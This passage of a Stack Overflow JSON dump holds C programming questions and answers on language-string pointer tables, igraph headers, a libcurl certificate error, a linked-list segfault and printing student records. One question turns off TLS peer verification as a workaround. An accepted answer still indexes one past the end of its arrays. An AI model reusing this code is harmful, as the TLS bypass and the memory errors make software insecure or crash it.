"user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 359, "user_id": 1649972, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/c73d3d11edb3caaa260a408af949d6c7?s=128&d=identicon&r=PG", "display_name": "user1649972", "link": "https://stackoverflow.com/users/1649972/user1649972"}, "edited": false, "score": 0, "creation_date": 1518710640, "post_id": 48790152, "comment_id": 84626341, "body": "@user1649972 You can keep the format of 2D array, but instead of string constants you would put the names of each specific string, i.e. <code>const char *langPtrs[NUMBER_OF_LANGS][NUMBER_OF_STRINGS]= { { helloAr, timeAr, dogAr }, { helloArFr, timeArFr, dogArFr } };</code>"}, {"owner": {"reputation": 359, "user_id": 1649972, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/c73d3d11edb3caaa260a408af949d6c7?s=128&d=identicon&r=PG", "display_name": "user1649972", "link": "https://stackoverflow.com/users/1649972/user1649972"}, "edited": false, "score": 0, "creation_date": 1518822861, "post_id": 48790152, "comment_id": 84677144, "body": "@dbush, thanks again. The printing is already handled elsewhere in various screen/menu/display classes so I don\u2019t want to change that. Those classes use the pointers to the char arrays (char* helloPtr etc.) to print so my plan is to simply point the char pointers to the character arrays of the newly selected language.  That way all the classes, methods etc. operate in the same way using the contents of the character pointers, but the character pointers now simply point at different arrays (the character arrays of the newly language selected). (1 of 3)"}, {"owner": {"reputation": 359, "user_id": 1649972, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/c73d3d11edb3caaa260a408af949d6c7?s=128&d=identicon&r=PG", "display_name": "user1649972", "link": "https://stackoverflow.com/users/1649972/user1649972"}, "edited": false, "score": 0, "creation_date": 1518822872, "post_id": 48790152, "comment_id": 84677147, "body": "If I create a 2D array as you suggested  i.e.  <code>const char *langPtrs[NUMBER_OF_LANGS][NUMBER_OF_STRINGS]= { { helloAr, timeAr, dogAr }, { helloArFr, timeArFr, dogArFr } }; </code> I will still have the old char pointers and still need to point these char pointers (char* helloPtr etc.) to the arrays stored in my new 2D array based on the language selected. To do this I will need all my original char pointers in an array so that I can reference them in a for loop using an index. (2 of 3)"}, {"owner": {"reputation": 359, "user_id": 1649972, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/c73d3d11edb3caaa260a408af949d6c7?s=128&d=identicon&r=PG", "display_name": "user1649972", "link": "https://stackoverflow.com/users/1649972/user1649972"}, "edited": false, "score": 0, "creation_date": 1518822883, "post_id": 48790152, "comment_id": 84677148, "body": "So again I need help to understand how to correctly write this so that my for loop assigns the address of the char array in my 2D array to the char pointer in my array of character pointers to character pointers. Would below work? <code>char ** usedInClassesPtrs[NUMBER_OF_CHAR_POINTERS]= {     helloPtr,     timePtr,     dogPtr, };</code> And then write <code>for(i = 0; i&lt;NUMBER_OF_CHAR_POINTERS; i++) {     usedInClassesPtrs [i]= charArrAddresses [selectedLang][i]; }</code> (3 of 3)"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 359, "user_id": 1649972, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/c73d3d11edb3caaa260a408af949d6c7?s=128&d=identicon&r=PG", "display_name": "user1649972", "link": "https://stackoverflow.com/users/1649972/user1649972"}, "edited": false, "score": 0, "creation_date": 1518897742, "post_id": 48790152, "comment_id": 84694979, "body": "@user1649972 See my edit.  It should address what you&#39;re looking to do."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 9, "last_activity_date": 1518897719, "last_edit_date": 1518897719, "creation_date": 1518620286, "answer_id": 48790152, "question_id": 48789963, "link": "https://stackoverflow.com/questions/48789963/array-of-pointers-to-pointers-managing-strings-for-different-languages/48790152#48790152", "title": "Array of pointers to pointers: managing strings for different languages", "body": "<p>Rather than placing the strings for all languages in a single array, make a 2D array of strings and languages.  If you don't plan on modifying any of these strings, you can make them string literals instead of arrays.</p>\n\n<pre><code>enum langs {\n    LANG_ENGLISH,\n    LANG_FRENCH,\n    NUMBER_OF_LANGS\n};\n\nenum strings{\n    STR_HELLO,\n    STR_TIME,\n    STR_DOG,\n    NUMBER_OF_STRINGS\n};\n\nconst char *langPtrs[NUMBER_OF_LANGS][NUMBER_OF_STRINGS]=\n{\n    { \"Hello\", \"Time\", \"Dog\" }\n    { \"Bonjour\", \"temps\", \"chien\" }\n};\n</code></pre>\n\n<p>Since the values of the symbols in an <code>enum</code> start at 0 and increment by 1 for each subsequent symbol, you can use them an array indexes.  The last member of each <code>enum</code>, which does not correspond to an actual element in the array, can be used as the size of the array.</p>\n\n<p>So if you want to, for example, print the string for \"time\" in French, you would use:</p>\n\n<pre><code>printf(\"%s\\n\", langPtrs[LANG_FRENCH][STR_TIME]);\n</code></pre>\n\n<p>If you want to always print string from whatever the \"current\" language is, you can create a pointer to the subarray for the current language:</p>\n\n<pre><code>const char **currentLang = langPtrs[LANG_FRENCH];\n</code></pre>\n\n<p>Then you can use that:</p>\n\n<pre><code>printf(\"%s\\n\", currentLang[STR_TIME]);\n</code></pre>\n\n<p>EDIT:</p>\n\n<p>If you want to keep <code>helloPtr</code>, <code>timePtr</code>, and <code>dogPtr</code>, and you want to set them based on the current language, you can put their addresses in another array:</p>\n\n<pre><code>const char **usedInClassesPtrs[NUMBER_OF_STRINGS] = {\n    &amp;helloPtr,\n    &amp;timePtr,\n    &amp;dogPtr\n}\n</code></pre>\n\n<p>Then loop through the array, dereferencing each element to give you the actual pointers you want to change, and assign them a string from the 2D language array based on the current language as follows:</p>\n\n<pre><code>for (i=0; i&lt;NUMBER_OF_STRINGS; i++) {\n    *usedInClassesPtrs[i] = langPtrs[currentLang][i];\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 6624534, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5dLyK3Q_f70/AAAAAAAAAAI/AAAAAAAAAMQ/IsLEiGgGS-4/photo.jpg?sz=128", "display_name": "Arman Imani", "link": "https://stackoverflow.com/users/6624534/arman-imani"}, "is_accepted": false, "score": 0, "last_activity_date": 1518624760, "creation_date": 1518624760, "answer_id": 48791607, "question_id": 48789963, "link": "https://stackoverflow.com/questions/48789963/array-of-pointers-to-pointers-managing-strings-for-different-languages/48791607#48791607", "title": "Array of pointers to pointers: managing strings for different languages", "body": "<p>The @debush answer should work quite well. \nFrom your example i assume that only 1 language is active at a time in your code. For that, i suggest to use a resource approach to manage your multi-language support. You can basically load the corresponding resource file of a language and store it in <code>std::vector&lt;std::string&gt;</code>, <code>std::map&lt;const enum/id/etc., std::string&gt;</code> or any similar data structure. This can be done either on the fly or at initialization stage depending on your need. In your code you save a pointer to this data structure <code>std::vector&lt;std::string&gt;* ptr</code> to refer to currently loaded language by invoking <code>(*ptr)[index]</code>.  </p>\n"}], "owner": {"reputation": 359, "user_id": 1649972, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/c73d3d11edb3caaa260a408af949d6c7?s=128&d=identicon&r=PG", "display_name": "user1649972", "link": "https://stackoverflow.com/users/1649972/user1649972"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 151, "favorite_count": 0, "answer_count": 2, "score": 3, "last_activity_date": 1518897719, "creation_date": 1518619696, "last_edit_date": 1518626027, "question_id": 48789963, "link": "https://stackoverflow.com/questions/48789963/array-of-pointers-to-pointers-managing-strings-for-different-languages", "title": "Array of pointers to pointers: managing strings for different languages", "body": "<p>I currently have a lot of character arrays that store simple character strings in English for display. I also have pointers to these character arrays.</p>\n\n<pre><code>char helloAr[20] = \"Hello\";\nchar timeAr[20] = \"Time\";\nchar dogAr[20] = \"Dog\";\n\nchar* helloPtr = helloAr;\nchar* timePtr = timeAr;\nchar* dogPtr = dogAr;\n</code></pre>\n\n<p>I am adding more character arrays in a different language, French to begin with. </p>\n\n<pre><code>char helloArFr[20] = \"Bonjour\";\nchar timeArFr[20] = \"temps\";\nchar dogArFr[20] = \"chien\";\n</code></pre>\n\n<p>If the user selects French I plan to change the address that all my pointers (currently pointing at the English character arrays) point to, so they now point to the French character arrays. I assume I can simply assign a new values to these pointers to do this,</p>\n\n<pre><code>helloPtr = helloArFr;\ntimePtr = timeArFr;\ndogPtr = dogArFr; \n</code></pre>\n\n<p>however my actual code will have a lot of arrays so I wanted to use a loop to do this rather than lots of statements like the one above.   </p>\n\n<p>To do this I plan to create an array of character pointers to the addresses of my character arrays.</p>\n\n<pre><code>char* charArrAddresses [NUMBER_OF_TEXT_ARRAYS]=\n{\n    &amp;helloAr,\n    &amp;timeAr,\n    &amp;dogAr,\n    &amp;helloArFr,\n    &amp;timeArFr,\n    &amp;dogArFr,\n};\n</code></pre>\n\n<p>I also plan to store all the pointers in an array so that I can reference them by their location in the array in my single statement, but this is where I need some help as I am unsure on how to do this. Something like this maybe?</p>\n\n<pre><code>char ** langPtrs[NUMBER_OF_LANG_POINTERS]=\n{\n    helloPtr,\n    timePtr,\n    dogPtr,\n};\n</code></pre>\n\n<p>In the single statement inside the loop I will use the selected language and the number of char arrays to calculate the correct index for <code>charArrAddresses</code>, lets call this <code>X</code> for now. I will use the value of my loop (say <code>i</code>) to index my <code>langPtrs</code> array.  So in my single want to say something like, </p>\n\n<pre><code>for(i = 0; i&lt;NUMBER_OF_LANG_POINTERS; i++)\n{\n    langPtrs[i]= charArrAddresses[X];\n}\n</code></pre>\n\n<p>I am trying to assign the address of the character array stored in index <code>X</code> of <code>charArrAddresses</code> to the pointer in index <code>i</code> in the <code>langPtrs</code> array. I just need help on exactly how to declare the <code>langPtrs</code> array and on how to write my single statement above.</p>\n"}, {"tags": ["c", "igraph", "header-files"], "comments": [{"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "edited": false, "score": 1, "creation_date": 1518623776, "post_id": 48789679, "comment_id": 84584461, "body": "Function <code>igraph_vector_init</code> is declared in a header file <code>igraph_vector_pmt.h</code> with <b>using macros</b>: <code>DECLDIR int FUNCTION(igraph_vector,init)(TYPE(igraph_vector)* v, long int size);</code>. Probably, macros are the reason why CLion doesn&#39;t autocomplete the function name. I don&#39;t know how to overcome this. May be, somehow one can tell CLion to use <i>precompiled headers</i> for autocompletion."}, {"owner": {"reputation": 366, "user_id": 741646, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5acffcfc1c672d0a7901ede6d19f45f0?s=128&d=identicon&r=PG", "display_name": "Kai", "link": "https://stackoverflow.com/users/741646/kai"}, "reply_to_user": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "edited": false, "score": 0, "creation_date": 1518623942, "post_id": 48789679, "comment_id": 84584576, "body": "A valuable hint! Thank you for that. I will investigate!"}], "owner": {"reputation": 366, "user_id": 741646, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5acffcfc1c672d0a7901ede6d19f45f0?s=128&d=identicon&r=PG", "display_name": "Kai", "link": "https://stackoverflow.com/users/741646/kai"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 93, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1604259050, "creation_date": 1518618788, "last_edit_date": 1604259050, "question_id": 48789679, "link": "https://stackoverflow.com/questions/48789679/where-can-i-find-missing-igraph-header-files", "title": "Where can I find missing igraph header files?", "body": "<p>i have compiled and installed igraph according to the documentation and no errors occurred, additionally i can use and compile the library just fine (I use CLION). No the code completion does not work for <em>some</em> of the functions, they seem to be quite basic functions. So I checked if my IDE know the header files installed, located in /usr/local/include/igraph (i use CentOS). It knows them, so i used grep to search through them to find e.g. <code>igraph_vector_init</code>, and it is nowhere to be found! No of course I would like the code completion to work and I am at a loss since the appropriate header files do not seem to contain the declarations of often-used functions! Is this a problem with my build? I also checked the online repository, without avail. Additionally I checked that the examples (which use the functions) and the documentation match the version, they do. What could I possibly miss?</p>\n"}, {"tags": ["c", "curl", "https", "ssl-certificate"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user6385115"}, "edited": false, "score": 0, "creation_date": 1518647562, "post_id": 48789667, "comment_id": 84597189, "body": "<a href=\"https://github.com/jimhester/gmailr/issues/44\" rel=\"nofollow noreferrer\">github.com/jimhester/gmailr/issues/44</a>"}], "answers": [{"tags": [], "owner": {"reputation": 1357, "user_id": 773102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/St5U2.gif?s=128&g=1", "display_name": "Jonny Schubert", "link": "https://stackoverflow.com/users/773102/jonny-schubert"}, "is_accepted": true, "score": 3, "last_activity_date": 1518799519, "creation_date": 1518799519, "answer_id": 48831308, "question_id": 48789667, "link": "https://stackoverflow.com/questions/48789667/libcurl-https-example-error/48831308#48831308", "title": "libcurl https example error", "body": "<p>I solved the problem by adding the option <strong>CAINFO</strong></p>\n\n<pre><code>curl_global_init(CURL_GLOBAL_DEFAULT);\nCURL *curl = curl_easy_init();\nif(curl)\n{\n    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1);\n    curl_easy_setopt(curl, CURLOPT_URL, \"https://example.com/\");\n    curl_easy_setopt(curl, CURLOPT_CAINFO, \"cacert.pem\");\n    CURLcode res = curl_easy_perform(curl);\n    if(res != CURLE_OK)\n        printf (\"res = %d curl_easy_perform() failed: %s\\n\",res, curl_easy_strerror(res));\n    curl_easy_cleanup(curl);\n}\ncurl_global_cleanup();\n</code></pre>\n"}], "owner": {"reputation": 1357, "user_id": 773102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/St5U2.gif?s=128&g=1", "display_name": "Jonny Schubert", "link": "https://stackoverflow.com/users/773102/jonny-schubert"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1708, "favorite_count": 2, "accepted_answer_id": 48831308, "answer_count": 1, "score": 1, "last_activity_date": 1518799519, "creation_date": 1518618753, "last_edit_date": 1518799334, "question_id": 48789667, "link": "https://stackoverflow.com/questions/48789667/libcurl-https-example-error", "title": "libcurl https example error", "body": "<p>I downloaded and slightly adapted this c <a href=\"https://raw.githubusercontent.com/curl/curl/master/docs/examples/https.c\" rel=\"nofollow noreferrer\">example</a> from the curl webpage. The test application uses my previously build curl.dll. I'm not able to connect to a https server without disabling the peer verification.</p>\n\n<p>My original test application:</p>\n\n<pre><code>curl_global_init(CURL_GLOBAL_DEFAULT);\nCURL *curl = curl_easy_init();\nif(curl) \n{\n    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1);\n    curl_easy_setopt(curl, CURLOPT_URL, \"https://example.com/\");\n    CURLcode res = curl_easy_perform(curl);\n    if(res != CURLE_OK)\n        printf (\"res = %d curl_easy_perform() failed: %s\\n\",res, curl_easy_strerror(res));\n    curl_easy_cleanup(curl);\n}\ncurl_global_cleanup();\n</code></pre>\n\n<p>The output is:</p>\n\n<pre><code>*   Trying XX.XXX.XXX.XX...\n* TCP_NODELAY set\n* Connected to example.com (XX.XXX.XXX.XX) port 443 (#0)\n* ALPN, offering http/1.1\n* SSL certificate problem: unable to get local issuer certificate\n* Closing connection 0\nres = 60 curl_easy_perform() failed: Peer certificate cannot be authenticated with given CA certificates\n</code></pre>\n\n<p>If I download and store a <a href=\"https://curl.haxx.se/docs/caextract.html\" rel=\"nofollow noreferrer\">cacert.pem</a> file from mozilla next to my exe and adapt the sample to:</p>\n\n<pre><code>curl_global_init(CURL_GLOBAL_DEFAULT);\nCURL *curl = curl_easy_init();\nif(curl) \n{\n    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1);\n    curl_easy_setopt(curl, CURLOPT_URL, \"https://example.com/\");\n    curl_easy_setopt(curl, CURLOPT_CAPATH, \".\");\n    CURLcode res = curl_easy_perform(curl);\n    if(res != CURLE_OK)\n        printf (\"res = %d curl_easy_perform() failed: %s\\n\",res, curl_easy_strerror(res));\n    curl_easy_cleanup(curl);\n}\ncurl_global_cleanup();\n</code></pre>\n\n<p>I still get an error message</p>\n\n<pre><code>*   Trying XX.XXX.XXX.XX...\n* TCP_NODELAY set\n* Connected to example.com (XX.XXX.XXX.XX) port 443 (#0)\n* ALPN, offering http/1.1\n* successfully set certificate verify locations:\n*   CAfile: none\n      CApath: .\n* SSL certificate problem: unable to get local issuer certificate\n* Closing connection 0\nres = 60 curl_easy_perform() failed: Peer certificate cannot be authenticated with given CA certificates\n</code></pre>\n\n<p>It is working fine if I disable peer verification. </p>\n\n<pre><code>curl_global_init(CURL_GLOBAL_DEFAULT);\nCURL *curl = curl_easy_init();\nif(curl) \n{\n    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);\n    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1);\n    curl_easy_setopt(curl, CURLOPT_URL, \"https://example.com/\");\n    curl_easy_setopt(curl, CURLOPT_CAPATH, \".\");\n    CURLcode res = curl_easy_perform(curl);\n    if(res != CURLE_OK)\n        printf (\"res = %d curl_easy_perform() failed: %s\\n\",res, curl_easy_strerror(res));\n    curl_easy_cleanup(curl);\n}\ncurl_global_cleanup();\n</code></pre>\n\n<p>Does anyone have an idea what causes this behaviour? Do I have to set the peer certificate? I haven't found a setter for this.</p>\n"}, {"tags": ["c", "linked-list"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518618774, "post_id": 48789651, "comment_id": 84581057, "body": "Segfault is a run-time error, not compiler. You need to provide <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "edited": false, "score": 1, "creation_date": 1518618819, "post_id": 48789651, "comment_id": 84581093, "body": "Do not cast return value of malloc."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 4, "creation_date": 1518618843, "post_id": 48789651, "comment_id": 84581118, "body": "What if the list is empty, i.e. if <code>head</code> is NULL?"}, {"owner": {"reputation": 2234, "user_id": 7013576, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0437af4dcb67ecdd180c7ed754188357?s=128&d=identicon&r=PG&f=1", "display_name": "Sruthi V", "link": "https://stackoverflow.com/users/7013576/sruthi-v"}, "edited": false, "score": 1, "creation_date": 1518618981, "post_id": 48789651, "comment_id": 84581212, "body": "The first case when the linked list is empty, head will be NULL. So add a condition to assign temp to head if head is null"}], "answers": [{"comments": [{"owner": {"reputation": 2234, "user_id": 7013576, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0437af4dcb67ecdd180c7ed754188357?s=128&d=identicon&r=PG&f=1", "display_name": "Sruthi V", "link": "https://stackoverflow.com/users/7013576/sruthi-v"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518619354, "post_id": 48789790, "comment_id": 84581495, "body": "@EugeneSh.  Made changes :)"}], "tags": [], "owner": {"reputation": 2234, "user_id": 7013576, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0437af4dcb67ecdd180c7ed754188357?s=128&d=identicon&r=PG&f=1", "display_name": "Sruthi V", "link": "https://stackoverflow.com/users/7013576/sruthi-v"}, "is_accepted": true, "score": 2, "last_activity_date": 1518619334, "last_edit_date": 1518619334, "creation_date": 1518619137, "answer_id": 48789790, "question_id": 48789651, "link": "https://stackoverflow.com/questions/48789651/segmentation-fault-compiler-error-in-c/48789790#48789790", "title": "segmentation fault compiler error in C", "body": "<p>Following my comment : The first case when the linked list is empty, head will be NULL. So add a condition to assign temp to head if head is null </p>\n\n<pre><code>Node* Insert(Node *head,int data)\n{\n  // Complete this method\n   Node *temp, *temp1;\n   temp1 = head;\n   temp = (Node *)malloc(sizeof(Node));\n   temp-&gt;data = data;\n   temp-&gt;next = NULL;\n   if(head==NULL) head=temp; //ADDED THIS LINE\n   else{\n     while(temp1-&gt;next!=NULL){\n        temp1 = temp1-&gt;next;\n     }\n   temp1-&gt;next = temp;\n   }\n  return head;\n}\n</code></pre>\n"}], "owner": {"reputation": 19, "user_id": 9250808, "user_type": "registered", "profile_image": "https://graph.facebook.com/981810375299085/picture?type=large", "display_name": "Amuly Pandey", "link": "https://stackoverflow.com/users/9250808/amuly-pandey"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 362, "favorite_count": 0, "closed_date": 1518619723, "accepted_answer_id": 48789790, "answer_count": 1, "score": -2, "last_activity_date": 1518619334, "creation_date": 1518618712, "question_id": 48789651, "link": "https://stackoverflow.com/questions/48789651/segmentation-fault-compiler-error-in-c", "closed_reason": "Not suitable for this site", "title": "segmentation fault compiler error in C", "body": "<pre><code>Node* Insert(Node *head,int data)\n{\n // Complete this method\n   Node *temp, *temp1;\n   temp1 = head;\n   temp = (Node *)malloc(sizeof(Node));\n   temp-&gt;data = data;\n   temp-&gt;next = NULL;\n   while(temp1-&gt;next!=NULL){\n       temp1 = temp1-&gt;next;\n   }\n   temp1-&gt;next = temp;\n   return head;\n}\n</code></pre>\n\n<p>I am trying to write simple code to insert at the end of the array. The method works for GCC compiler, but gives segmentation fault error when compiling using an online compiler on HackerRank. Does the program work differently for different compilers.   </p>\n"}, {"tags": ["c", "struct"], "comments": [{"owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "edited": false, "score": 3, "creation_date": 1518618318, "post_id": 48789485, "comment_id": 84580708, "body": "<code>scanf(&quot;%d&quot;,&amp;a[x].rollno);</code>-&gt;<code>scanf(&quot;%d&quot;,&amp;a[i].rollno);</code> and similar across all the looping."}, {"owner": {"reputation": 13, "user_id": 7488399, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97c06e9884c702af683be5f964f95561?s=128&d=identicon&r=PG&f=1", "display_name": "Ayaz khan", "link": "https://stackoverflow.com/users/7488399/ayaz-khan"}, "reply_to_user": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "edited": false, "score": 0, "creation_date": 1518618448, "post_id": 48789485, "comment_id": 84580794, "body": "How do i print all names in the code in only one loop what will be the logic"}, {"owner": {"reputation": 2630, "user_id": 1983197, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AwjpR.png?s=128&g=1", "display_name": "LordWilmore", "link": "https://stackoverflow.com/users/1983197/lordwilmore"}, "edited": false, "score": 0, "creation_date": 1518618930, "post_id": 48789485, "comment_id": 84581183, "body": "Loop through all entries, and print the name field in each: <code>for(int i=0;i&lt;x;i++) { printf(&quot;\\n%s&quot;,a[i].name); }</code>"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1518624014, "post_id": 48789485, "comment_id": 84584620, "body": "Somebody did your work of applying decent indentation. Please consider to accept the edit. Please also rethink whether this is the right way for making a question."}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 1, "creation_date": 1518625469, "post_id": 48789485, "comment_id": 84585696, "body": "Also: <code>scanf(&quot;%s&quot;,&amp;a[x].name);</code> -&gt; <code>scanf(&quot;%s&quot;, a[i].name);</code>"}], "answers": [{"tags": [], "owner": {"reputation": 58292, "user_id": 34824, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/ri8DI.jpg?s=128&g=1", "display_name": "abelenky", "link": "https://stackoverflow.com/users/34824/abelenky"}, "is_accepted": false, "score": 0, "last_activity_date": 1518625560, "creation_date": 1518625560, "answer_id": 48791862, "question_id": 48789485, "link": "https://stackoverflow.com/questions/48789485/how-to-print-all-id-names-in-one-loop/48791862#48791862", "title": "how to print all id names in one loop?", "body": "<p>The loop increases <code>i</code> from <code>0</code> to some other value <code>x</code>.<br>\n<em>(lets say <code>x</code> is 5 for this example)</em></p>\n\n<p>So <code>i</code> has values 0, 1, 2, 3....</p>\n\n<p>But regardless, you only put data into one element of the array: 5<br>\nAnd you keep overwriting that same element over and over again.<br>\nAnd 5 isn't even a valid index!!  The valid indicies are 0, 1, 2, 3, 4.<br>\n5 is one-past the end of the array!<br></p>\n"}, {"tags": [], "owner": {"reputation": 16, "user_id": 7778308, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5271b4b681f73255ab7f302a73c6293b?s=128&d=identicon&r=PG&f=1", "display_name": "Dhiraj B.", "link": "https://stackoverflow.com/users/7778308/dhiraj-b"}, "is_accepted": true, "score": 0, "last_activity_date": 1518781349, "creation_date": 1518781349, "answer_id": 48826040, "question_id": 48789485, "link": "https://stackoverflow.com/questions/48789485/how-to-print-all-id-names-in-one-loop/48826040#48826040", "title": "how to print all id names in one loop?", "body": "<pre><code>#include&lt;stdio.h&gt;\n#include&lt;conio.h&gt;  \nstruct student\n{\n    int std;\n    char fee[90];                                 \n    int rollno;\n    char name[15];\n    char sub[100];\n};\nmain()\n{\n    int x;\n    printf(\"******Enter the total number of Student from HOD*******:\\n\");\n    scanf(\"%d\",&amp;x);\n    struct student a[x];\n    for(int i=0;i&lt;x;i++)\n    {\n        printf(\"\\nEnter Rollno:\\t\");\n        scanf(\"%d\",&amp;a[x].rollno);\n        printf(\"\\nEnter name:\\t\");\n        scanf(\"%s\",&amp;a[x].name);\n        printf(\"\\nIs Fee Submitted:\\t\");\n        scanf(\"%s\",&amp;a[x].fee);\n        printf(\"\\nEnter Subject name:\\t\");\n        scanf(\"%s\",a[x].sub);\n    }\n    printf(\"\\n****Display All Student names****\");\n    for(int i=0;i&lt;x;i++)\n    {\n        printf(\"\\n%s\",a[x].name);\n    }   \n\n    struct faculty\n    {\n        char Fname[100];\n        char Sname[100];\n    };\n\n    int y;\n    printf(\"\\n\\n********Please HOD enter the total faculty members********:\\n\");\n    scanf(\"%d\",&amp;y);\n    struct faculty b[y];\n    for(int j=0;j&lt;y;j++)\n    {\n        printf(\"\\nEnter Faculty Member Name:\\t\");\n        scanf(\"%s\",&amp;b[y].Fname);\n        printf(\"\\nEnter their Subjects:\\t\");\n        scanf(\"%s\",&amp;b[y].Sname);\n    }\n    printf(\"\\n****Display all Faculty Member Name****\");\n    for(int j=0;j&lt;y;j++)\n    {\n        printf(\"\\n%s\",b[y].Fname);\n    }\n\n    struct employes\n    {\n        char ename[100];\n        char rank[100];\n    };\n    int z;\n    printf(\"\\n\\n********Please HOD enter the total no of Employes*******:\\n\");\n    scanf(\"%d\",&amp;z);            //You used %s instead of %d\n    struct employes c[z];\n    for(int j=0;j&lt;z;j++)  //You used wrong variable 'y' here\n    {\n        printf(\"\\nEnter the Employe name:\\t\");\n        scanf(\"%s\",&amp;c[z].ename);  //You used wrong variable 'y' here\n        printf(\"\\nEnter their ranks:\\t\");  \n        scanf(\"%s\",&amp;c[z].rank);  //You used wrong variable 'y' here\n\n    }\n    printf(\"\\n****Display all Employe names****\");\n    for(int j=0;j&lt;z;j++)  //You used wrong variable 'y' here\n    {\n        printf(\"\\n%s\",c[z].ename);  //You used wrong variable 'y' here\n    